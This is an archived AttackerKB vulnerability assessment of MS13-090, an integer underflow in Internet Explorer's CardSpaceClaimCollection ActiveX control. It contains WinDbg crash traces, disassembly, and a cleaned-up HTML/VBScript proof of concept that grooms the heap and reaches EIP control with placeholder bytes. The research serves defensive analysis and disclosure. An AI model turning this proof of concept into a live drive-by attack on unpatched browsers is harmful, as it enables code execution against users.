---
title: MS13-090 CardSpaceClaimCollection ActiveX Integer Underflow
author: jvazquez-r7
score: 2
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2013-11-12T14:35:00'
created: '2019-09-12T18:07:14.342524'
revision_date: '2020-06-10T21:36:55.404382'
assessment_id: ec4642e3-ede8-41ca-a001-c1c54e13dec0
topic_id: efa04c1f-0c48-4862-b1ce-56ea65b67c60
topic_short_id: oZdteRSNGs
topic_slug: ms13-090-cardspaceclaimcollection-activex-integer-underflow
akb_topic_url: https://attackerkb.com/topics/oZdteRSNGs/ms13-090-cardspaceclaimcollection-activex-integer-underflow
akb_assessment_url: https://attackerkb.com/topics/oZdteRSNGs/ms13-090-cardspaceclaimcollection-activex-integer-underflow#ec4642e3-ede8-41ca-a001-c1c54e13dec0
---

# MS13-090 CardSpaceClaimCollection ActiveX Integer Underflow

*Assessment by jvazquez-r7, archived from [AttackerKB](https://attackerkb.com/topics/oZdteRSNGs/ms13-090-cardspaceclaimcollection-activex-integer-underflow#ec4642e3-ede8-41ca-a001-c1c54e13dec0).*

---

Originally located at:
http://pastebin.com/v3gGXtkf

JSunpack:
0fe86b1a6fc27dbd4134d96e68b9153682cc6831

# References

* http://blogs.technet.com/b/srd/archive/2013/11/12/technical-details-of-the-targeted-attack-using-cve-2013-3918.aspx
* http://blogs.technet.com/b/msrc/archive/2013/11/11/activex-control-issue-being-addressed-in-update-tuesday.aspx
* http://pastebin.com/v3gGXtkf
* http://pastebin.com/a0ypqMJA
* http://www.fireeye.com/blog/technical/2013/11/new-ie-zero-day-found-in-watering-hole-attack.html
* http://technet.microsoft.com/en-us/security/bulletin/ms13-090

word keys: icardie.dll


# Crash

:)

```
(f00.eb0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0290f1bc ebx=00000000 ecx=03cc0210 edx=020bf5fc esi=00000002 edi=03f8150c
eip=cccccccc esp=020bf5cc ebp=020bf5d8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
cccccccc ??              ???

0:008> kb
ChildEBP RetAddr  Args to Child
WARNING: Frame IP not in any known module. Following frames may be wrong.
020bf5c8 63663c41 03d6ea80 020bf60c 020bf630 0xcccccccc
020bf5d8 63663d7d 03cc0210 038c31d0 03cc0210 mshtml!PlainTrackerAddRef+0x20
020bf630 03f9226c 03cc0210 03f814fc 020bf694 mshtml!PlainTrackerQueryInterface+0x82
020bf698 03f921f4 03cc0210 020bf6a8 03bc4728 vbscript!VAR::ObjGetDefault+0x67
020bf6ac 03f83a13 00000000 038f2110 00008000 vbscript!VAR::PvarGetVarVal+0x20
020bf6bc 03f841c3 038f2110 020bf7ac 020bf824 vbscript!VAR::PvarGetArithVal+0xc
020bf6d4 03f8f730 038f2100 038f20f0 020bf934 vbscript!VbsVarRel+0x24
020bf7cc 03f863ee 020bf934 e17be18b 00000000 vbscript!CScriptRuntime::RunNoEH+0x1641
020bf814 03f86373 020bf934 038c2958 038c31d0 vbscript!CScriptRuntime::Run+0x62
020bf90c 03f86ba5 020bf934 00000000 00000000 vbscript!CScriptEntryPoint::Call+0x51
020bf968 03f86d9d 038c2958 020bfb30 00000000 vbscript!CSession::Execute+0xc8
020bf9b8 03fa052c 020bfb30 020bfb40 00000008 vbscript!COleScript::ExecutePendingScripts+0x144
020bfa1c 03f8a2ec 028eab74 02877e04 00000000 vbscript!COleScript::ParseScriptTextCore+0x243
020bfa48 635bf025 038c25ac 028eab74 02877e04 vbscript!COleScript::ParseScriptText+0x2b
020bfaa0 635be7ca 0022c750 02d60700 0023d490 mshtml!CScriptCollection::ParseScriptText+0x219
020bfb64 635be5ab 00000000 00000000 00000000 mshtml!CScriptElement::CommitCode+0x3a9
020bfb98 635ac020 7c80932e 001e8688 001e8688 mshtml!CScriptElement::Execute+0xc4
020bfbec 635a74f0 0282c460 7c80932e 001e8688 mshtml!CHtmParse::Execute+0x4a
020bfc04 635a7266 635a6a75 000c79e5 001e8688 mshtml!CHtmPost::Broadcast+0xf
020bfcc4 635ae7ae 000c79e5 00000000 001e8688 mshtml!CHtmPost::Exec+0x5f6
020bfcdc 635ac21b 000c79e5 0021a090 00000180 mshtml!CHtmPost::Run+0x178
020bfcfc 635cece9 0021a090 000c79e5 001e8688 mshtml!PostManExecute+0x1fd
020bfd24 6364de62 63ab0d18 0021a090 0021a090 mshtml!CPostManager::PostManOnTimer+0x134
020bfd58 6363c3c5 020bfde0 6363c317 00000000 mshtml!GlobalWndOnMethodCall+0xfb
020bfd78 7e418734 0003049e 00000008 00000000 mshtml!GlobalWndProc+0x183
020bfda4 7e418816 6363c317 0003049e 00008002 USER32!InternalCallWinProc+0x28
020bfe0c 7e4189cd 00000000 6363c317 0003049e USER32!UserCallWinProcCheckWow+0x150
020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306
020bfe7c 01252ec9 020bfe94 00000000 008d5db8 USER32!DispatchMessageW+0xf
020bfeec 011f48bf 00171d80 00000001 0014f860 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461
020bffa4 5de05a60 008d5db8 0c20002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1
020bffb4 7c80b713 0014f860 00000001 0c20002f iertutil!CIsoScope::RegisterThread+0xab
020bffec 00000000 5de05a52 0014f860 00000000 kernel32!BaseThreadStart+0x37


0:008> dd eax
0290f1bc  cccccccc cccccccc cccccccc cccccccc
0290f1cc  cccccccc cccccccc cccccccc cccccccc
0290f1dc  cccccccc cccccccc 00000000 e8660255
0290f1ec  ff080000 000000aa 00000000 00000000
0290f1fc  00000000 00000000 00000000 00000000
0290f20c  00000000 00000000 00000000 00000000
0290f21c  00000000 e866022c ff080000 000000b1
0290f22c  00000000 00000000 00000000 00000000
```


Crash without controllling EIP, but interesting to go into the thing:

```
(ea8.d98): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0018fec4 ecx=038e1b80 edx=038e1b80 esi=008dfff0 edi=fffffffb
eip=036a9d1a esp=020bf3e4 ebp=020bf3f8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
icardie!CCardSpaceClaimCollection::remove+0x74:
036a9d1a ff34b8          push    dword ptr [eax+edi*4] ds:0023:ffffffec=????????
0:008> .symfix
0:008> .reload
Reloading current modules
................................................................
........
0:008> kb
ChildEBP RetAddr  Args to Child
020bf3f8 77135cd9 008dfff0 038e1b80 020bf448 icardie!CCardSpaceClaimCollection::remove+0x74
020bf414 771362e8 008dfff0 0000002c 00000004 OLEAUT32!DispCallFunc+0x16a
020bf4a4 036a49e2 0289b8a4 008dfff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x234
020bf4d0 036aa200 008dfff0 00000018 00000409 icardie!ATL::CComTypeInfoHolder::Invoke+0x42
020bf4f8 036d3eb7 008dfff0 00000018 036d1a2c icardie!ATL::IDispatchImpl<ICardSpaceClaimCollection,&IID_ICardSpaceClaimCollection,&LIBID_icardie,1,0,ATL::CComTypeInfoHolder>::Invoke+0x27
020bf534 036d3e27 008dcef0 008dfff0 00000018 vbscript!IDispatchInvoke2+0xb2
020bf570 036d3397 008dcef0 008dfff0 00000018 vbscript!IDispatchInvoke+0x59
020bf684 036d3d88 008dcef0 008dfff0 00000018 vbscript!InvokeDispatch+0x13a
020bf6a8 036d409f 008dcef0 008dfff0 00000018 vbscript!InvokeByName+0x42
020bf7b4 036d63ee 020bf91c dd7edec9 00000000 vbscript!CScriptRuntime::RunNoEH+0x234c
020bf7fc 036d6373 020bf91c 008dd7d8 008dcef0 vbscript!CScriptRuntime::Run+0x62
020bf8f4 036d6ba5 020bf91c 00000000 00000000 vbscript!CScriptEntryPoint::Call+0x51
020bf950 036d6d9d 008dd7d8 020bfb18 00000000 vbscript!CSession::Execute+0xc8
020bf9a0 036f052c 020bfb18 020bfb28 00000008 vbscript!COleScript::ExecutePendingScripts+0x144
020bfa04 036da2ec 02dc958c 02877de4 00000000 vbscript!COleScript::ParseScriptTextCore+0x243
020bfa30 635bf025 008dd44c 02dc958c 02877de4 vbscript!COleScript::ParseScriptText+0x2b
020bfa88 635be7ca 0022cb88 028fd828 0023d9e8 mshtml!CScriptCollection::ParseScriptText+0x219
020bfb4c 635be5ab 00000000 00000000 00000000 mshtml!CScriptElement::CommitCode+0x3a9
020bfb80 635ac020 7c80932e 001e9350 001e9350 mshtml!CScriptElement::Execute+0xc4
020bfbd4 635a74f0 028b9060 7c80932e 001e9350 mshtml!CHtmParse::Execute+0x4a
020bfbec 635a7266 635a6a75 003c3522 001e9350 mshtml!CHtmPost::Broadcast+0xf
020bfcac 635ae7ae 003c3522 00000000 001e9350 mshtml!CHtmPost::Exec+0x5f6
020bfcc4 635ac21b 003c3522 00000000 001e9350 mshtml!CHtmPost::Run+0x178
020bfce4 635ac17e 0021a5e8 003c3522 001e9350 mshtml!PostManExecute+0x1fd
020bfd04 635ac0e2 00000001 00000018 020bfd24 mshtml!PostManResume+0xf8
020bfd14 63655d60 0023ad68 001e9350 020bfd58 mshtml!CHtmPost::OnDwnChanCallback+0x10
020bfd24 6364de62 0023ad68 00000000 0021a5e8 mshtml!CDwnChan::OnMethodCall+0x19
020bfd58 6363c3c5 020bfde0 6363c317 00000000 mshtml!GlobalWndOnMethodCall+0xfb
020bfd78 7e418734 0021046e 0000000e 00000000 mshtml!GlobalWndProc+0x183
020bfda4 7e418816 6363c317 0021046e 00008002 USER32!InternalCallWinProc+0x28
020bfe0c 7e4189cd 00000000 6363c317 0021046e USER32!UserCallWinProcCheckWow+0x150
020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306
020bfe7c 01252ec9 020bfe94 00000000 008d5d28 USER32!DispatchMessageW+0xf
020bfeec 011f48bf 00170fc0 00000001 0014f860 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461
020bffa4 5de05a60 008d5d28 00bc002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1
020bffb4 7c80b713 0014f860 00000001 00bc002f iertutil!CIsoScope::RegisterThread+0xab
020bffec 00000000 5de05a52 0014f860 00000000 kernel32!BaseThreadStart+0x37
```

# PoC cleanup:

```
<html><body>
<object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='CardSpaceSigninHelper'></object>
<script language='JavaScript'>

function get_code(){
	var code = "\ubbbb\ubbbb\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc\ucccc";
	return code;
}
</script>
<script language='vbscript'>
On Error Resume Next
Dim jjvmscqvm,eoyehpnucwq,hcanmotm
eoyehpnucwq = -7
hcanmotm = 0
jjvmscqvm = 5493
Dim massage_array(5493)

Set required_claims = CardSpaceSigninHelper.requiredClaims

For i = 0 to 5493
	Set massage_array(i) = document.createElement("object")
Next

For i = 4093 to 5493 Step 2
	massage_array(i) = Null
Next

For i = 0 to -7 Step -1
	required_claims.remove(CLng(i))
Next

Dim my_code
my_code = get_code()
required_claims.add(my_code)

For i = 0 to 5493
	if massage_array(i) <> Null Then
		massage_array(i).focus
	End If
Next

'For i = 0 to 5493
'	massage_array(i) = Null
'Next

</script></body></html>
```


Exploit module targeting xp sp3 IE8 on sploits, no spray needed :)


Time to dig more into the vulnerability....


First of all reviewing the CCardSpaceClaimCollection which is abused. It is a 0x10 size object:

```
.text:0040A6E8                 and     dword ptr [edi], 0
.text:0040A6EB                 push    ebx
.text:0040A6EC                 push    esi
.text:0040A6ED                 push    10h             ; unsigned int
.text:0040A6EF                 mov     ebx, 8007000Eh
.text:0040A6F4                 call    ??2@YAPAXI@Z    ; operator new(uint)
```

Where

0x0 ==> vftable
0x4 ==> unknown
0x8 ==> number of elements
0xc ==> pointer to the CCardSpaceClaimCollection elements (It's a SafeArray storage: http://msdn.microsoft.com/en-us/library/windows/desktop/ms221482(v=vs.85).aspx)

Both three fields are initialized to 0 / NULL when creating an instance:

```
.text:00409980 ; public: __thiscall CCardSpaceClaimCollection::CCardSpaceClaimCollection(void)
.text:00409980                 xor     ecx, ecx
.text:00409982                 mov     [eax+4], ecx
.text:00409985                 mov     [eax+8], ecx
.text:00409988                 mov     [eax+0Ch], ecx
.text:0040998B                 retn
```

The first problem start on CCardSpaceClaimCollection::remove, if you try to remove an element from a 0 length collection, the length field is underflowed:

```
.text:00409D46 loc_409D46:                             ; CODE XREF: CCardSpaceClaimCollection::remove(tagVARIANT *)+85j
.text:00409D46                 dec     dword ptr [esi+8] ;  esi pointing to the CCardSpaceClaimCollection
```

Debugging the underflow (rembember little endian):

```
0:017> bu icardie!CCardSpaceClaimCollection::remove+0xa0
0:017> g
ModLoad: 033b0000 033c2000   C:\WINDOWS\system32\icardie.dll
ModLoad: 63380000 63434000   C:\WINDOWS\system32\jscript.dll
ModLoad: 034e0000 0354a000   C:\WINDOWS\system32\vbscript.dll
Breakpoint 0 hit
eax=03672280 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=00000000
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=00000000
0:008> g
Breakpoint 0 hit
eax=0367227c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=ffffffff
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=ffffffff
0:008> g
Breakpoint 0 hit
eax=03672278 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffe
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=feffffff
0:008> g
Breakpoint 0 hit
eax=03672274 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffd
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fdffffff
0:008> g
Breakpoint 0 hit
eax=03672270 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffc
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fcffffff
0:008> g
Breakpoint 0 hit
eax=0367226c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffb
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fbffffff
0:008> g
Breakpoint 0 hit
eax=03672268 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffa
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=faffffff
0:008> g
Breakpoint 0 hit
eax=03672264 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffff9
eip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
icardie!CCardSpaceClaimCollection::remove+0xa0:
033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=f9ffffff
0:008> g
```

The second problem happens on CCardSpaceClaimCollection::add

First of all the SafeArray Container is get:

```
.text:00409C0A                 mov     esi, [ebp+arg_0]
.text:00409C0D                 call    ?GetInnerArray@CCardSpaceClaimCollection@@AAEPAUtagSAFEARRAY@@XZ ; C
```

 and its capacity checked, so if needed it's going to be resized

```
.text:00409C20 loc_409C20:                             ; CODE XREF: CCardSpaceClaimCollection::add(tagVARIANT *)+48j
.text:00409C20                 mov     ebx, [esi+8]    ; The number of elements
.text:00409C23                 inc     ebx             ; The number of elements incremented
.text:00409C24                 call    ?GrowInnerArrayIfRequired@CCardSpaceClaimCollection@@AAEJJ@Z ;
```

SIn order to check if the collections needs to be resized GrowInnerArrayIfRequired checks the elements container after increment, with
the capacity of the SafeArray, sinze the comparision is signed, nothing is resized:

```
0:008> g
Breakpoint 4 hit
eax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44
eip=036a9e41 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x2e:
036a9e41 3bda            cmp     ebx,edx
0:008> r ebx, edx
ebx=fffffff9 edx=0000000a
```

Because of the signed comparision, nothing is resized:

```
0:008> t
eax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44
eip=036a9e43 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei ng nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x30:
036a9e43 7e1f            jle     icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x51 (036a9e64) [br=1]
```

A pointer to the data of the SafeArray is stored into a local variable:

```
.text:00409C2F                 lea     eax, [ebp+ppvData]
.text:00409C32                 push    eax             ; ppvData
.text:00409C33                 push    [ebp+psa]       ; psa
.text:00409C36                 call    ds:__imp__SafeArrayAccessData@8 ; SafeArrayAccessData(x,x)
```

An string with the contents is created, and the contents are stored into the ppvData, unfortunately.... here the underflowed counter is used:

```
.text:00409C51                 push    dword ptr [edi+8] ; psz
.text:00409C54                 call    ds:__imp__SysAllocString@4 ; SysAllocString(x)
.text:00409C5A                 mov     ecx, [esi+8]
.text:00409C5D                 mov     edx, [ebp+ppvData]
.text:00409C60                 mov     [edx+ecx*4], eax ; edx pointer to ppvdata, ecx is the corrupted CCardSpaceClaimCollection length
```

Finally the CCardSpaceClaimCollection size is incremented:

```
.text:00409C63                 inc     dword ptr [esi+8]
```

When debugging :

```
0:008> t
eax=001f5884 ebx=00000000 ecx=fffffff8 edx=00000028 esi=0035e6b8 edi=00242b44
eip=036a9c5d esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
icardie!CCardSpaceClaimCollection::add+0x8e:
036a9c5d 8b55f8          mov     edx,dword ptr [ebp-8] ss:0023:0201f3f0=10798a03
0:008> t
```

Here the underflow happens edx+ecx*4 points to 038a78f0, which is under 038a7910, where ppvData lives:

```
eax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44
eip=036a9c60 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
icardie!CCardSpaceClaimCollection::add+0x91:
036a9c60 89048a          mov     dword ptr [edx+ecx*4],eax ds:0023:038a78f0=00000000
0:008> t
eax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44
eip=036a9c63 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
icardie!CCardSpaceClaimCollection::add+0x94:
036a9c63 ff4608          inc     dword ptr [esi+8]    ds:0023:0035e6c0=f8ffffff
```

Later a fake object is used:

```
0:008> g
(b4c.b70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=001f5884 ebx=00000000 ecx=038a78e0 edx=0201f5e4 esi=00000002 edi=036d150c
eip=cccccccc esp=0201f5b4 ebp=0201f5c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
cccccccc ??              ???
0:008> dd ecx
038a78e0  63ab1b18 00000002 6363fbe4 03894d38
038a78f0  001f5884 00000000 00000000 00000000
038a7900  00000000 00000000 00000000 00000000
038a7910  00000000 00000000 00000000 00000000
038a7920  00000000 00000000 00000000 00000000
038a7930  00000000 00000000 e8319dff ff080100
038a7940  63ab1b18 00000001 6363fbe4 03894f08
038a7950  63767260 00000000 00000000 00020000
0:008> db 001f5884
001f5884  bb bb bb bb cc cc cc cc-cc cc cc cc cc cc cc cc  ................
001f5894  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
001f58a4  cc cc cc cc cc cc cc cc-00 00 00 00 e6 7e a1 ea  .............~..
001f58b4  00 01 08 ff 70 18 5c 75-2c 18 5c 75 02 00 00 00  ....p.\u,.\u....
001f58c4  e8 ac 9c 02 00 00 00 80-f3 1b 5d 75 b8 58 1f 00  ..........]u.X..
001f58d4  48 00 9c 02 84 14 5c 75-e8 ac 9c 02 1b 00 00 00  H.....\u........
001f58e4  e8 52 19 00 ed 7e a1 ea-00 01 08 ff 08 00 00 00  .R...~..........
001f58f4  90 01 00 00 f0 00 00 00-00 00 00 00 01 00 00 00  ................
```
